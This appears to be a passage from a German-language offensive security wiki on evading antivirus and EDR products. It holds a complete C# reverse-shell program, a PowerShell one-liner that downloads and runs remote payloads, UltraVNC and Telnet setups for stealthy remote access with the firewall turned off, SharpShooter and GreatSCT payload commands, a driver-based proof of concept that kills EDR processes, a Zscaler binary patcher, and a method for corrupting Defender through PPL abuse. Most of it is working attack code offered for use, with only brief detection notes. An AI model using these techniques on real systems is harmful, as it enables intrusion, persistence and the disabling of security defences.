```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt solltest du normale .NET API wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus, suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* Payload zu lokalisieren. Oft speichert die Malware sie als TLV-codiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss **wieder her**, ohne dass du das bösartige Sample ausführen musst – nützlich, wenn du auf einem Offline-Workstation arbeitest.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Das Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Compilation Suite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing mehr software security bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache verwendet, um zur Compile-Zeit obfuskierten code zu erzeugen, ohne ein externes Tool zu verwenden und ohne den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuszierter Operationen hinzu, die vom C++ template metaprogramming framework erzeugt werden und das Leben der Person, die die Anwendung cracken möchte, etwas schwieriger machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene unterschiedliche pe files obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein abgestimmtes code obfuscation framework für LLVM-unterstützte Sprachen unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuskiert ein Programm auf assembly code-Ebene, indem reguläre Instruktionen in ROP chains umgewandelt werden und so unsere natürliche Vorstellung von normalem control flow zunichtemacht.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in shellcode umwandeln und sie dann laden

## SmartScreen & MoTW

Möglicherweise hast du diesen Bildschirm schon gesehen, wenn du einige executables aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endnutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und so den Endnutzer warnen und daran hindern, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man More Info -> Run anyway anklickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Prüfen des Zone.Identifier ADS für eine Datei, die aus dem Internet heruntergeladen wurde.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass executables, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, deine payloads davor zu bewahren, die Mark of The Web zu erhalten, besteht darin, sie in einen Container wie ein ISO zu packen. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **nicht-NTFS**-Volumes angewendet werden **kann**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabekontainer packt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) verpackt werden

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten ermöglicht, **Events zu loggen**. Er kann jedoch auch von Security-Produkten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (bypassed) wird, ist es auch möglich, die **`EtwEventWrite`**-Funktion des User-Space-Prozesses sofort zurückkehren zu lassen, ohne irgendwelche Events zu loggen. Dies geschieht, indem die Funktion im Speicher gepatcht wird, sodass sie unmittelbar zurückkehrt, wodurch das ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Infos findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C# binaries im Speicher ist schon seit längerer Zeit bekannt und immer noch eine sehr gute Möglichkeit, deine post-exploitation tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die disk zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C# assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Wege, dies zu tun:

- **Fork\&Run**

Dabei wird **ein neuer Opferprozess gestartet**, dein bösartiger post-exploitation code in diesen neuen Prozess injiziert, dein bösartiger code ausgeführt und anschließend der neue Prozess beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass die Überlebenschance unseres **Implants** deutlich höher ist, falls bei unserer post-exploitation-Aktion etwas schiefgeht oder entdeckt wird. Der Nachteil ist, dass die Chance, von **Behavioural Detections** erwischt zu werden, **größer** ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige code **in seinen eigenen Prozess** injiziert. So kannst du vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass bei Problemen mit der Ausführung deiner Payload die Wahrscheinlichkeit **deutlich höher** ist, deinen Beacon zu verlieren, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C# Assemblies lesen möchtest, schau dir bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und ihr InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst auch C# Assemblies **von PowerShell** laden, schau dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen code mit anderen Sprachen auszuführen, indem man dem kompromittierten System Zugriff **auf die Interpreter-Umgebung gibt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf der SMB-Freigabe erlaubst, kannst du **beliebigen code im Speicher** des kompromittierten Systems in diesen Sprachen ausführen.

Das Repo weist darauf hin: Defender scannt die Scripts weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Scripts in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, mit der ein Angreifer das **Access Token oder ein Security-Produkt wie ein EDR oder AV manipulieren** kann, um dessen Privilegien zu reduzieren, sodass der Prozess nicht beendet wird, aber keine Berechtigungen hat, nach bösartigen Aktivitäten zu suchen.

Um das zu verhindern, könnte Windows **externen Prozessen** verbieten, Handles auf die Tokens von Security-Prozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu installieren und ihn dann zu übernehmen und persistenten Zugriff zu behalten:
1. Lade es von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer still auf dem Opfer aus (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehe zurück zur Chrome Remote Desktop-Seite und klicke auf Weiter. Der Assistent fordert dich dann zur Autorisierung auf; klicke zum Fortfahren auf den Authorize-Button.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, mit dem sich der pin ohne GUI setzen lässt).


## Advanced Evasion

Evasion ist ein sehr kompliziertes Thema. Manchmal musst du viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es in ausgereiften Umgebungen nahezu unmöglich, völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und dir diesen aufteilt.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Webangebot unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 wurden alle Windows-Versionen mit einem **Telnet-Server** ausgeliefert, den du (als Administrator) so installieren konntest:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Make it **start** wenn das System gestartet wird und **run** es jetzt:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Lade es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Danach verschiebe die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **victim**

#### **Reverse connection**

Der **attacker** sollte **innerhalb** seines **host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er **bereit** ist, eine reverse **VNC connection** entgegenzunehmen. Danach, auf dem **victim**: Starte den winvnc daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNING:** Um stealth zu bewahren, darfst du ein paar Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft, mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [the config window](https://i.imgur.com/rfMQWcf.png)
- Führe `winvnc -h` nicht für Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Lade es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starte den Listener** mit `msfconsole -r file.rc` und **führe** den **xml payload** mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Kompilieren unserer eigenen Reverse Shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# Obfuscators-Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von python für Build-Injector-Beispiele:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space töten

Storm-2603 nutzte ein kleines Konsolen-Utility namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen vor dem Ausrollen von Ransomware zu deaktivieren. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Services nicht blockieren können.

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber das Binary ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland erreichbar wird.
3. **Vom Treiber exponierte IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (zum Töten von Defender/EDR-Services verwendet) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**:  BYOVD umgeht User-Mode-Schutzmaßnahmen vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Detection / Mitigation
•  Aktiviere Microsofts Vulnerable-Driver-Blockliste (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwache das Erstellen neuer *Kernel*-Services und alarmiere, wenn ein Treiber aus einem world-writable Verzeichnis geladen wird oder nicht auf der Allowlist steht.
•  Achte auf Handles aus dem User-Mode zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung von Zscaler Client Connector Posture Checks per On-Disk Binary Patching

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen machen einen vollständigen Bypass möglich:

1. Die Posture-Evaluierung erfolgt **vollständig clientseitig** (ein boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte validieren nur, dass das verbindende Executable **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|-------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jeder Check compliant ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch unsignierte) kann an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die ursprünglichen Dateien ersetzt und der Service-Stack neu gestartet wurde:

* **Alle** Posture-Checks zeigen **grün/konform**.
* Unsigned oder modifizierte Binaries können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit ein paar Byte-Patches umgangen werden können.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) erzwingt eine Signer/Level-Hierarchie, sodass nur gleich- oder höher geschützte Prozesse einander manipulieren können. Offensiv gilt: Wenn du ein PPL-fähiges Binary legitim starten und seine Argumente kontrollieren kannst, kannst du harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, durch PPL gestützte Write-Primitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess und den Flags erstellt werden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Es muss ein kompatibler Protection-Level angefordert werden, der zum Signer des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Levels schlagen bei der Erstellung fehl.

Siehe auch eine allgemeinere Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tooling
- Open-source-Helfer: CreateProcessAsPPL (wählt den Protection-Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungs-Muster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-Primitive: ClipUp.exe
- Das signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei in einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn es als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen parsen; verwende 8.3-Short-Paths, um auf normalerweise geschützte Orte zu zeigen.

8.3-Short-Path-Helper
- Short-Namen auflisten: `dir /x` in jedem Parent Directory.
- Short Path in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse-Chain (abstrakt)
1) Starte den PPL-fähigen LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Logpfad-Argument, um eine Dateierstellung in einem geschützten AV-Directory zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Short-Namen.
3) Wenn das Ziel-Binary normalerweise vom AV geöffnet/verriegelt ist, während es läuft (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten vor dem Start des AV, indem du einen Auto-Start-Service installierst, der zuverlässig früher läuft. Validiere die Boot-Reihenfolge mit Process Monitor (boot logging).
4) Beim Reboot erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binaries verriegelt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen redaktionell gekürzt/verkürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht über die Platzierung hinaus steuern; die Primitive eignet sich eher zur Beschädigung als zur präzisen Content-Injection.
- Erfordert lokalen admin/SYSTEM, um einen Dienst zu installieren/starten, sowie ein Reboot-Fenster.
- Timing ist kritisch: Das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit umgeht Dateisperren.

Detections
